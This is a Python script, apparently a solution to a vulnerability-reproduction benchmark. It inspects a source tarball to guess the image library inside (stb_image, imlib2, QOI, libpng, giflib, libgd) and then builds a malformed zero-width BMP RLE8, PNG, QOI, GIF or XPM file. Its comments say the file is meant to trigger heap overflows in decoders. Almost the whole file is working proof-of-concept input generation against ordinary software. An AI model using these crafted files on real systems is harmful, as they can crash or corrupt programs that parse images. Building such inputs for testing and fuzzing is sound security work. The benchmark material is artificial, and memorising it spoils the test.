import os
import tarfile
import struct
import zlib
from typing import Optional


def _read_members_text(tar: tarfile.TarFile, max_files: int = 200, max_bytes: int = 8192) -> str:
    text_chunks = []
    count = 0
    for m in tar.getmembers():
        if count >= max_files:
            break
        if not m.isfile():
            continue
        # Skip big files
        if m.size > 2 * 1024 * 1024:
            continue
        try:
            f = tar.extractfile(m)
            if f is None:
                continue
            data = f.read(max_bytes)
            try:
                s = data.decode('utf-8', errors='ignore')
            except Exception:
                s = ''
            text_chunks.append(s.lower())
            count += 1
        except Exception:
            continue
    return '\n'.join(text_chunks)


def _detect_format(src_path: str) -> str:
    # Return a suggested format to target: 'bmp', 'png', 'qoi', 'gif', 'xpm'
    try:
        with tarfile.open(src_path, 'r:*') as tar:
            names = [m.name.lower() for m in tar.getmembers() if m.isfile()]
            names_str = '\n'.join(names)
            text = _read_members_text(tar, max_files=200, max_bytes=8192)

            # Detect stb_image (common with BMP RLE bug on zero width/height)
            if ('stb_image.h' in names_str) or ('stb_image' in text) or ('stbi_' in text):
                # Prefer BMP RLE PoC
                return 'bmp'

            # Detect imlib2 (often XPM and other formats, zero-sized image bugs common)
            if ('imlib2' in names_str) or ('imlib2' in text):
                return 'xpm'

            # Detect QOI decoders directly
            if ('qoi.h' in names_str) or ('qoiformat' in text) or ('qoif' in text) or ('qoi_decode' in text):
                return 'qoi'

            # Detect spng or generic png decoders
            if ('spng.h' in names_str) or ('libspng' in text) or ('pngread' in names_str) or ('png.h' in names_str) or ('libpng' in text) or ('png_' in text):
                return 'png'

            # Detect gif decoders (giflib, etc.)
            if ('gif_lib.h' in names_str) or ('giflib' in text) or ('gifdec' in names_str) or ('dgif' in text):
                return 'gif'

            # Detect libgd (handles many formats, but BMP often)
            if ('libgd' in text) or ('gd_' in text):
                return 'bmp'

            # Fallback: BMP RLE is a good generic to trigger zero-width handling issues
            return 'bmp'
    except Exception:
        # If we can't analyze, fallback to BMP
        return 'bmp'


def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    length = struct.pack('>I', len(data))
    crc = zlib.crc32(chunk_type)
    crc = zlib.crc32(data, crc) & 0xffffffff
    crc_bytes = struct.pack('>I', crc)
    return length + chunk_type + data + crc_bytes


def _generate_png_zero_dimension(height: int = 16, color_type: int = 6, bit_depth: int = 8) -> bytes:
    # Create a PNG with width=0 (invalid), non-interlaced.
    # IDAT contains 'height' scanlines, each with only the filter byte (since width=0 => rowbytes=0).
    signature = b'\x89PNG\r\n\x1a\n'
    width = 0
    ihdr = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, 0, 0, 0)
    ihdr_chunk = _png_chunk(b'IHDR', ihdr)
    # raw scanlines: just filter bytes (0) for each row
    raw = b'\x00' * height
    idat = zlib.compress(raw)
    idat_chunk = _png_chunk(b'IDAT', idat)
    iend_chunk = _png_chunk(b'IEND', b'')
    return signature + ihdr_chunk + idat_chunk + iend_chunk


def _generate_gif_zero_dimension(width: int = 0, height: int = 1) -> bytes:
    # Minimal GIF89a with global color table and an image descriptor of zero width.
    header = b'GIF89a'
    # Logical Screen Descriptor
    # Packed: Global Color Table Flag set, color resolution 1, sort flag 0, size of GCT 1 (2 entries)
    packed = 0b10000001
    bg_color_index = 0
    pixel_aspect = 0
    lsd = struct.pack('<HHBBB', width, height, packed, bg_color_index, pixel_aspect)
    # Global Color Table (2 colors)
    gct = bytes([0, 0, 0, 255, 255, 255])  # black and white

    # Image Descriptor
    sep = b'\x2C'
    left = 0
    top = 0
    packed_id = 0  # no local color table
    idesc = sep + struct.pack('<HHHHB', left, top, width, height, packed_id)

    # Image Data: LZW minimum code size and empty data sub-blocks followed by 0 terminator
    lzw_min_code_size = b'\x02'
    # Provide one small (nonsensical) sub-block to tickle decoders; followed by terminator
    data_subblocks = b'\x01' + b'\x00' + b'\x00'  # one byte 0x00 then terminator
    trailer = b'\x3B'

    return header + lsd + gct + idesc + lzw_min_code_size + data_subblocks + trailer


def _generate_qoi_zero_dimension(height: int = 1, channels: int = 4, colorspace: int = 0) -> bytes:
    # QOI header: magic 'qoif', width (BE), height (BE), channels, colorspace
    magic = b'qoif'
    width = 0
    header = magic + struct.pack('>I', width) + struct.pack('>I', height) + bytes([channels, colorspace])
    # Provide one pixel op (QOI_OP_RGBA) to force decoders that don't check width*height to write one pixel
    # QOI_OP_RGBA = 0xFE, followed by RGBA bytes
    pixel = b'\xFE' + b'\x00\x00\x00\xff'
    # End marker: 7 zero bytes and 0x01
    end = b'\x00' * 7 + b'\x01'
    return header + pixel + end


def _generate_bmp_rle8_zero_width(height: int = 1) -> bytes:
    # BMP with BITMAPINFOHEADER, 8bpp, RLE8 compression, WIDTH=0, HEIGHT=height
    # Create minimal palette (2 colors), and minimal RLE8 data that writes 1 pixel then EOL and EOB.
    bfType = b'BM'
    biSize = 40
    biWidth = 0
    biHeight = height
    biPlanes = 1
    biBitCount = 8
    biCompression = 1  # BI_RLE8
    # RLE data: run of 1 pixel value 1, EOL, EOB
    rle_data = bytes([0x01, 0x01, 0x00, 0x00, 0x00, 0x01])
    biSizeImage = len(rle_data)
    biXPelsPerMeter = 2835
    biYPelsPerMeter = 2835
    biClrUsed = 2
    biClrImportant = 0

    # BITMAPINFOHEADER
    bih = struct.pack('<IiiHHIIIIII',
                      biSize, biWidth, biHeight, biPlanes, biBitCount,
                      biCompression, biSizeImage, biXPelsPerMeter, biYPelsPerMeter,
                      biClrUsed, biClrImportant)

    # Palette: 2 entries (blue, green) ARGB? Actually palette entries are B,G,R,0
    palette = bytes([0, 0, 0, 0, 255, 255, 255, 0])

    bfOffBits = 14 + len(bih) + len(palette)
    bfSize = bfOffBits + len(rle_data)
    bfReserved1 = 0
    bfReserved2 = 0
    bfh = struct.pack('<2sIHHI', bfType, bfSize, bfReserved1, bfReserved2, bfOffBits)

    return bfh + bih + palette + rle_data


def _generate_xpm_zero_dimension(height: int = 1) -> bytes:
    # Minimal XPM with 0 width, 1 height, 1 color
    # XPM is ASCII; many decoders might crash when width or height is zero.
    lines = []
    lines.append("/* XPM */")
    lines.append("static char *zero_dim_xpm[] = {")
    lines.append("\"0 1 1 1\",")
    lines.append("\"a c #000000\",")
    for _ in range(height):
        lines.append("\"\",")
    lines.append("};")
    return ("\n".join(lines)).encode('ascii')


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _detect_format(src_path)
        if fmt == 'bmp':
            # BMP RLE8 zero-width: good candidate for heap overflow in many decoders
            return _generate_bmp_rle8_zero_width(height=1)
        if fmt == 'png':
            # PNG zero-width
            return _generate_png_zero_dimension(height=16, color_type=6, bit_depth=8)
        if fmt == 'qoi':
            # QOI zero-width
            return _generate_qoi_zero_dimension(height=1, channels=4, colorspace=0)
        if fmt == 'gif':
            # GIF zero-width
            return _generate_gif_zero_dimension(width=0, height=1)
        if fmt == 'xpm':
            # XPM zero-width
            return _generate_xpm_zero_dimension(height=1)
        # Fallback to BMP RLE8
        return _generate_bmp_rle8_zero_width(height=1)